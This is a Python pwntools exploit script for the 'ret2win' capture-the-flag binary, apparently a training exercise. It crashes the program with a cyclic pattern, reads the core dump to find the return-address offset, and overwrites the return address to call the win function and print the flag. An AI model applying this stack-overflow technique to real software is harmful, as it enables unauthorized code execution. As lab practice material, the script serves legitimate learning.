#!/bin/usr/python3

from pwn import *

def start():
    binary_path = './ret2win'
    p = process(binary_path) 
    gdb.attach(p, gdbscript='''
        
        break main
        continue
    ''')
    return p


elf = context.binary =  ELF("./ret2win")
#p = process(elf.path)

# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

io = start()
info("%#x target: ret2win", elf.symbols.ret2win)# Send the payload
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['tmux']
payload = cyclic(128)
io.sendlineafter(">", payload)

io.wait()

core = io.corefile

# Print out the address of ESP at the time of crashing
stack = core.rsp
info("stack = %#x", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Print out the address of EIP at the time of crashing
rip_offset = cyclic_find(pattern)
info('located RIP offset at {a}'.format(a=rip_offset))

# Craft a new payload which puts the "target" address at the correct offset
#payload = flat(
#    asm('nop') * rip_offset,
#    elf.symbols.ret2win
#)
payload = fit({
    pattern: elf.symbols.ret2win + 4
})
f = open("./payload64_2", "wb")
f.write(payload)
f.close()
# Send the payload to a new copy of the process
io = start()
io.sendlineafter(">", payload)
tmp1 = io.recv()
print(tmp1)
tmp2 = io.recv()
print(tmp2)
tmp3 = io.recv()
print(tmp3)
#tmp4 = io.recv()
# Get our flag!
flag = io.recvline()
success(flag)

print(flag)
